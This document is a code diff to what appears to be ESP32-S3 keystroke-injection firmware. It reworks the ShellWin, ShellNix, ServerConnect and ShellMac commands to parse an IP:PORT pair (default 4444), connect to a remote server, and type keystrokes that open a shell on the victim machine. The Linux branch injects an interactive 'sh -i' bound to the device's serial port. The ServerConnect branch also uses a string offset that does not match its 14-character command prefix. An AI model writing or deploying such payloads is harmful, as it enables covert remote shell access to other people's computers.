@@ -951,15 +951,27 @@ void payloadExec() {
   }
 
   else if (cmd.startsWith("ShellWin ")) {
-    cmd.toCharArray(Command, cmd.length() + 1);
-    serverIP = Command + 9;
-
-    if (!clientServer.connect(serverIP, serverPort)) {
-      while (1)
-        ;
+    String connectionString = cmd.substring(9);
+    String ip;
+    int port;
+    // Parse IP:PORT or use default 4444
+    int colonPos = connectionString.indexOf(':');
+    if (colonPos == -1) {
+        ip = connectionString;
+        port = 4444; // Default port
+    } else {
+        ip = connectionString.substring(0, colonPos);
+        port = connectionString.substring(colonPos + 1).toInt();
     }
-
-    delay(3000);
+    // Connect with 5 second timeout
+    unsigned long startTime = millis();
+    bool connected = false;
+    while (!(connected = clientServer.connect(ip.c_str(), port))) {
+        if (millis() - startTime >= 5000) {
+            return;
+        }
+        delay(100);
+    }
 
     Keyboard.press(KEY_LEFT_GUI);
     Keyboard.print("r");
@@ -976,15 +988,46 @@ void payloadExec() {
   }
 
   else if (cmd.startsWith("ShellNix ")) {
-    cmd.toCharArray(Command, cmd.length() + 1);
-    serverIP = Command + 9;
-
-    if (!clientServer.connect(serverIP, serverPort)) {
-      while (1)
-        ;
+    String connectionString = cmd.substring(9);
+    String ip;
+    int port;
+    // Parse IP:PORT or use default 4444
+    int colonPos = connectionString.indexOf(':');
+    if (colonPos == -1) {
+        ip = connectionString;
+        port = 4444; // Default port
+    } else {
+        ip = connectionString.substring(0, colonPos);
+        port = connectionString.substring(colonPos + 1).toInt();
     }
-
-    delay(3000);
+    // Connect with 5 second timeout
+    unsigned long startTime = millis();
+    bool connected = false;
+    while (!(connected = clientServer.connect(ip.c_str(), port))) {
+        if (millis() - startTime >= 5000) {
+            return;
+        }
+        delay(100);
+    }
+    // Default device name
+    String deviceName = "Espressif_Systems_ESP32S3";
+    // Check if USB config exists and get product name
+    if (LittleFS.exists("/usb_config.txt")) {
+        File usbConfig = LittleFS.open("/usb_config.txt", FILE_READ);
+        if (usbConfig) {
+            // Read productName
+            usbConfig.readStringUntil('\n');
+            usbConfig.readStringUntil('\n');
+            String productName = usbConfig.readStringUntil('\n');
+            productName.trim();
+            if (productName.length() > 0) {
+                // Replace spaces with underscores
+                productName.replace(" ", "_");
+                deviceName = productName;
+            }
+            usbConfig.close();
+        }
+    }
 
     Keyboard.press(KEY_LEFT_CTRL);
     Keyboard.press(KEY_LEFT_ALT);
@@ -992,32 +1035,61 @@ void payloadExec() {
     delay(100);
     Keyboard.releaseAll();
     delay(500);
-    Keyboard.println("sh -i > /dev/serial/by-id/*Espressif_Systems_ESP32S3* 2>&1 < /dev/serial/by-id/*Espressif_Systems_ESP32S3*");
+    Keyboard.println("sh -i > /dev/serial/by-id/*" + deviceName + "* 2>&1 < /dev/serial/by-id/*" + deviceName + "*");
   }
 
   else if (cmd.startsWith("ServerConnect ")) {
-    cmd.toCharArray(Command, cmd.length() + 1);
-    // the server IP is extracted from the Command array starting from the 14th index
-    serverIP = Command + 14;
+    String connectionString = cmd.substring(9);
+    String ip;
+    int port;
 
-    // connect loop
-    if (!clientServer.connect(serverIP, serverPort)) {
-      while (1)
-        ;
+    // Parse IP:PORT or use default 4444
+    int colonPos = connectionString.indexOf(':');
+    if (colonPos == -1) {
+        ip = connectionString;
+        port = 4444; // Default port
+    } else {
+        ip = connectionString.substring(0, colonPos);
+        port = connectionString.substring(colonPos + 1).toInt();
+    }
+
+    // Connect with 5 second timeout
+    unsigned long startTime = millis();
+    bool connected = false;
+
+    while (!(connected = clientServer.connect(ip.c_str(), port))) {
+        if (millis() - startTime >= 5000) {
+            return;
+        }
+        delay(100);
     }
   }
-
+  
   else if (cmd.startsWith("ShellMac ")) {
-    cmd.toCharArray(Command, cmd.length() + 1);
-    serverIP = Command + 9;
+    String connectionString = cmd.substring(9);
+    String ip;
+    int port;
 
-    // connect loop
-    if (!clientServer.connect(serverIP, serverPort)) {
-      while (1)
-        ;
+    // Parse IP:PORT or use default 4444
+    int colonPos = connectionString.indexOf(':');
+    if (colonPos == -1) {
+        ip = connectionString;
+        port = 4444; // Default port
+    } else {
+        ip = connectionString.substring(0, colonPos);
+        port = connectionString.substring(colonPos + 1).toInt();
     }
 
-    delay(3000);
+    // Connect with 5 second timeout
+    unsigned long startTime = millis();
+    bool connected = false;
+
+    while (!(connected = clientServer.connect(ip.c_str(), port))) {
+        if (millis() - startTime >= 5000) {
+            return;
+        }
+        delay(100);
+    }
 
     // run spotlight/alfred prompt
     Keyboard.press(KEY_LEFT_GUI);
